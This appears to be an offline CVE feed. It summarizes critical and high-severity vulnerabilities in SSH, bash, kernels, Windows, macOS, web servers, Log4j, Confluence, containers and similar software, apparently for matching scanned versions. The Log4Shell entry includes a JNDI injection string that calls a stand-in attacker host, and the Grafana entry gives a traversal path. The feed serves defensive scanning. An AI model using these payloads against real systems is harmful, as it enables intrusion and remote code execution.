_about: Pinned offline CVE feed — CRITICAL/HIGH CVEs for 32 product families including openssh, bash, linux kernel, windows, macos, apache httpd, nginx, openssl, log4j, spring, confluence, jenkins, gitlab, docker, kubernetes, elasticsearch, exim, apache tomcat, iis, jira, grafana, keycloak, and common system tools. Covers Log4Shell, Spring4Shell, regreSSHion, Shellshock, Dirty Pipe/COW (copy-fail), EternalBlue, BlueKeep, Zerologon, PrintNightmare, Follina, Heartbleed, Terrapin, FragAttacks (dirty-frag), PwnKit, Baron Samedit, Leaky Vessels, and more. Last updated: 2026-06-30.

_schema.product: lowercase product name matched against service banners/version strings
_schema.ranges: list of {introduced, fixed}; a version V is affected if introduced<=V<fixed (either bound may be omitted)
_schema.aliases: well-known vulnerability name(s) — for display and search

records.summary: regreSSHion: signal-handler race condition in sshd enables unauthenticated RCE as root — glibc async-signal-safe regression re-introduced in 8.5p1.
Race condition in async signal handler in the OpenSSH privsep child process — lower-privilege variant of CVE-2024-6387.
ssh-agent PKCS#11 RCE: a remote attacker who can forward an ssh-agent socket loads arbitrary PKCS#11 providers, achieving code execution in the agent.
OS command injection via shell metacharacters in a hostname when ProxyCommand or ProxyJump is configured — malicious host entries execute arbitrary commands.
Terrapin: SSH prefix truncation attack strips handshake messages via sequence-number manipulation using ChaCha20-Poly1305 or CBC+ETM, downgrading security extensions.
Privilege escalation when AuthorizedKeysCommand or AuthorizedPrincipalsCommand runs as a non-sshd user — supplementary group memberships are not cleared properly.
scp command injection via shell metacharacters in the destination argument — untrusted server filenames execute arbitrary commands on the client.
scp: a malicious server can overwrite arbitrary files on the client because the destination filenames are not validated against the requested names.
Username enumeration via asymmetric timing — the server responds differently for valid vs. invalid usernames during public-key authentication.
PKCS#11 module loading via agent forwarding allows a remote attacker to load arbitrary shared objects and execute code in the ssh-agent process.
Shellshock: bash executes trailing commands after function definitions exported in environment variables — RCE via CGI, DHCP, SSH forced-command, and any env-var injection vector.
Shellshock variant: parser state confusion bypasses the CVE-2014-6271 patch — arbitrary command execution through a different bash function-definition code path.
Shellshock: out-of-bounds memory read in word-list processing enables memory corruption and code execution.
Shellshock: off-by-one error in nested-function processing enables code execution via deeply nested bash constructs.
Florian's Shellshock: code execution bypassing both CVE-2014-6271 and CVE-2014-7169 patches via a distinct parser code path.
Heap buffer overflow in bash via crafted command-line argument — enables local privilege escalation when bash runs in a privileged context.
nf_tables use-after-free via double-free in nft_verdict_init() — widely exploited LPE with public PoC, affects kernels 3.15–6.6.13.
perf_event_open: heap out-of-bounds write in samples_period validation enables local privilege escalation.
StackRot: maple tree node rotation use-after-free in memory management — unprivileged users can escalate to root via arbitrary kernel-memory read/write.
nf_tables: use-after-free via anonymous set with NFTA_SET_EXPR in a netfilter transaction enables local privilege escalation.
Dirty Pipe (copy-fail): pipe_write() PIPE_BUF_FLAG_CAN_MERGE not cleared on new pipe pages — overwrites read-only file-backed pages, bypassing copy-on-write.
nf_tables: heap out-of-bounds write in nft_fwd_dup_netdev_offload() enables local privilege escalation via crafted netfilter expressions.
eBPF verifier: incorrect integer range tracking allows a crafted BPF program to bypass bounds checks and achieve local privilege escalation.
Ubuntu overlayfs: unprivileged user in user namespace applies file capabilities to files — local privilege escalation on Ubuntu kernel builds.
Dirty COW: race condition in copy-on-write — unprivileged users write to read-only root-owned files; widely exploited, public PoC since disclosure.
PwnKit: pkexec argument-array corruption corrupts environment variables passed to execve() — any unprivileged user achieves root without knowing a password.
Baron Samedit: heap buffer overflow in sudo via 'sudoedit -s' with a backslash-terminated argument enables privilege escalation to root without the user's password.
FragAttacks / dirty-frag: 802.11 accepts non-SPP A-MSDU frames — arbitrary network-packet injection by exploiting fragmentation and aggregation flaws in Wi-Fi drivers.
FragAttacks / dirty-frag: fragments from different 802.11 SAs are reassembled (mixed-key attack) enabling plaintext injection into victim connections.
Windows TCP/IP IPv6 RCE: unauthenticated, no user interaction, wormable via crafted IPv6 packets — disable IPv6 or apply August 2024 cumulative update.
Windows DWM Core Library heap buffer overflow — exploited as privilege-escalation 0-day in QakBot campaigns prior to public disclosure.
Outlook RCE via crafted file:// hyperlink bypassing Protected View — causes NTLM hash leakage and potential remote code execution.
Outlook zero-click NTLM hash theft: crafted calendar reminder triggers a UNC path connection relaying Net-NTLMv2 hashes to attacker — APT28 0-day.
Windows Office HTML RCE via specially crafted document — Storm-0978/RomCom ransomware 0-day; no patch on initial disclosure, mitigated by ASR rule.
Follina: MSDT RCE via the ms-msdt URI scheme invoked from Office documents — no macros needed, preview pane triggers RCE (0-day, used by multiple nation-state APTs).
PrintNightmare: Windows Print Spooler RpcAddPrinterDriverEx() RCE as SYSTEM and LPE — exploited within hours of PoC disclosure.
Zerologon: Netlogon cryptographic flaw (all-zero ClientChallenge) allows unauthenticated domain-controller takeover and full domain compromise in seconds.
BlueKeep: Remote Desktop Services pre-auth RCE via crafted RDP packets — wormable, affects Windows XP/Vista/7/2003/2008, used by coin-miners and APTs.
EternalBlue: SMBv1 RCE via crafted Transaction2 request — weaponized by WannaCry (2017) and NotPetya; affects all unpatched Windows versions with SMBv1 enabled.
RTKit memory corruption enables arbitrary kernel code execution — actively exploited 0-day affecting iOS/macOS Sonoma < 14.3.1.
WebKit: processing maliciously crafted web content leads to arbitrary code execution — actively exploited 0-day in Safari.
XNU kernel: arbitrary kernel-memory write via crafted app — used as part of the TriangleDB / Operation Triangulation spyware chain (zero-click).
IOSurfaceAccelerator out-of-bounds write enables kernel code execution — actively exploited 0-day patched in macOS Ventura 13.3.1 / iOS 16.4.1.
Kernel out-of-bounds write: app executes arbitrary code with kernel privileges — actively exploited 0-day (macOS Ventura < 13.1, iOS < 16.2).
macOS kernel privilege escalation via out-of-bounds write — actively exploited 0-day in macOS Monterey < 12.5.1.
XPC type confusion: app executes arbitrary code with kernel privileges — exploited by Pegasus-adjacent toolchains in macOS Big Sur < 11.6.
mod_rewrite: OOB write via specially crafted URI patterns enables SSRF and path traversal to arbitrary filesystem locations or backend services.
mod_rewrite substitution encoding bypass — RewriteRule backreference encoding allows information disclosure and RCE in specific configurations.
HTTP request smuggling in mod_proxy via specially crafted request line — bypasses access controls and enables backend request smuggling or cache poisoning.
mod_sed: OOB read/write via crafted input on 32-bit systems — enables memory corruption and potential RCE when mod_sed is loaded.
LimitXMLRequestBody integer overflow on 32-bit systems — requests exceeding ~2GB trigger OOB write in the XML request parser.
Apache 2.4.49 path traversal and RCE via mod_cgi — unauthenticated access to files outside the document root; actively exploited 0-day within hours.
Path traversal bypass (CVE-2021-41773 incomplete fix) via .%2e encoding — RCE via mod_cgi in Apache 2.4.49-2.4.50.
mod_proxy SSRF: a crafted URI causes the server to forward requests to an arbitrary origin, enabling internal-network access and request forgery.
Off-by-one heap write in the nginx DNS resolver via crafted UDP DNS response — potential RCE when the resolver directive is enabled.
ngx_http_mp4_module: use-after-free via crafted mp4 file — enables worker process compromise or DoS when the mp4 module is compiled in.
ngx_http_mp4_module: OOB read/write via crafted mp4 file — worker process crash or heap memory disclosure (stable branch < 1.22.1).
HTTP/2 Data Dribble DoS: many small frames over multiple streams cause excessive CPU consumption — affects nginx and other HTTP/2 stacks.
HTTP/2 Resource Loop DoS: PRIORITY frame manipulation causes a resource loop exhausting CPU — affects nginx and multiple HTTP/2 implementations.
ngx_http_mp4_module integer overflow via MDAT atom smaller than declared — causes worker process crash or infinite loop.
Range filter integer overflow: crafted Range header causes OOB heap read — leaks cached file content or adjacent worker memory.
Stack buffer overflow via crafted HTTP chunked Transfer-Encoding header (negative chunk size) — remote code execution in nginx < 1.5.0.
Lua script sandbox escape allowing code execution in the Redis process via EVAL commands with untrusted Lua code.
Heartbleed: TLS heartbeat extension reads up to 64KB beyond the payload — leaks private keys, session tokens, and memory to unauthenticated remote attackers.
FREAK: clients accept RSA export cipher suites in SERVER_KEY_EXCHANGE — enables MITM to downgrade and decrypt TLS sessions using factored export keys.
DROWN: SSLv2 export cipher oracle — ~1000 SSLv2 connections decrypt a modern TLS session via cross-protocol attack; disable SSLv2 immediately.
Infinite loop in BN_mod_sqrt() via crafted certificate with invalid elliptic curve — DoS for any application parsing external certificates (TLS client/server, OCSP, etc.).
X.509 email-address punycode buffer overflow (stack) during TLS certificate verification — initially rated CRITICAL, later downgraded; patch to 3.0.7.
Log4Shell: JNDI lookup injection in log4j2 — any logged string containing ${jndi:ldap://attacker/a} triggers remote class loading and unauthenticated RCE.
Incomplete fix for CVE-2021-44228: thread-context lookup in non-default patterns still exploitable for RCE via crafted JNDI string.
Spring4Shell: class loader manipulation via data binding on JDK9+ enables writing a JSP web-shell and achieving unauthenticated RCE on Tomcat-deployed Spring MVC apps.
Spring Cloud Function routing expression SpEL injection — remote code execution via crafted routing-expression header with no authentication required.
Improper authorisation in Confluence Data Center/Server allows unauthenticated attacker to reset Confluence and create admin account — full server takeover.
Broken access control in Confluence Data Center allows a remote attacker to create an admin account via a specially crafted request — zero-click privilege escalation.
OGNL injection in Confluence Server/DC via the template injection path — unauthenticated RCE widely exploited in the wild; patch immediately.
Arbitrary file read via the Jenkins CLI's args4j file expansion — unauthenticated read of /etc/passwd and SSH keys; leads to RCE via deserialization gadgets in some configurations.
Jenkins CLI Java deserialization — unauthenticated RCE via crafted serialized payload to the remoting service on port 50000; widely exploited.
Password reset tokens sent to unverified email addresses — unauthenticated account takeover for any GitLab user by controlling an additional email address.
Unauthenticated RCE via ExifTool image metadata parsing — DjVu file upload triggers server-side command execution without any authentication.
Leaky Vessels: leaked file descriptor (WORKDIR race) in runc — container process obtains host filesystem handle and can escape the container boundary.
runc /proc/self/exe overwrite — a malicious container can overwrite the host runc binary and gain root on the host.
Kubernetes API server node-proxy bypass — users with CREATE pods/exec can escalate to cluster-admin by directing requests via a node proxy that bypasses admission webhook validation.
Bypass of imagePolicyWebhook via ephemeral containers — privileged images can be injected into existing pods without triggering admission policy controls.
Host network reachability bypass — pods with hostNetwork can reach localhost services on the node (kube-apiserver, kubelet, etcd) that should not be exposed.
Elasticsearch StackOverflow via deeply nested _search query — unauthenticated DoS by sending a crafted search request with many nested boolean clauses.
Sensitive data exposure in Elasticsearch node-join audit log — internal cluster credentials leak to the log file on cluster join events.
Exim dnsdb out-of-bounds read — crafted PTR record triggers heap read past buffer boundary; may lead to information disclosure or process crash.
21Nails: heap-based buffer overflow in Exim SMTP receiver via overlength MAIL FROM line — unauthenticated remote code execution as the exim user.
Off-by-one heap overflow in Redis integer reply parsing — maliciously crafted RESP response can trigger arbitrary code execution in the Redis client library.
Redis SRANDMEMBER infinite loop — remote attacker with access to redis-cli can cause a DoS by specifying a crafted command argument.
Tomcat JSESSIONID cookie missing Secure attribute on non-HTTPS connectors — session token transmitted in plaintext over HTTP.
HTTP/1.1 request smuggling in Tomcat via invalid content-length — attacker can poison the request queue between the reverse proxy and Tomcat.
Partial PUT handling bypass in Tomcat allows overwriting uploaded file content — race condition enables information disclosure or content injection.
HTTP Protocol Stack (http.sys) use-after-free — unauthenticated wormable remote code execution in Windows IIS 10 HTTP/2 stack; patch immediately (KB5003171).
Buffer overflow in IIS 6.0 WebDAV ScStoragePathFromUrl — unauthenticated RCE via a crafted PROPFIND request; widely used in ransomware campaigns.
Full read SSRF in Jira Server via the batch endpoint — authenticated attacker can probe internal network resources via the Jira application server.
Server-side template injection in Jira ContactAdministrators action — unauthenticated RCE if the Contact Administrators form is enabled (default in some deployments).
Unauthenticated path traversal via the plugin data source endpoint — /public/plugins/PLUGIN/../../ leaks arbitrary files from the Grafana server filesystem.
Race condition in Grafana OAuth token validation — concurrent authentication requests can exchange tokens, granting a lower-privileged user access to another session.
Reflected XSS via the 'scope' parameter in Keycloak OIDC flows — attacker can steal session tokens or forge requests as an authenticated user.
Insufficient client scope validation in Keycloak — a client can request scopes beyond those assigned in the realm policy without server-side enforcement.
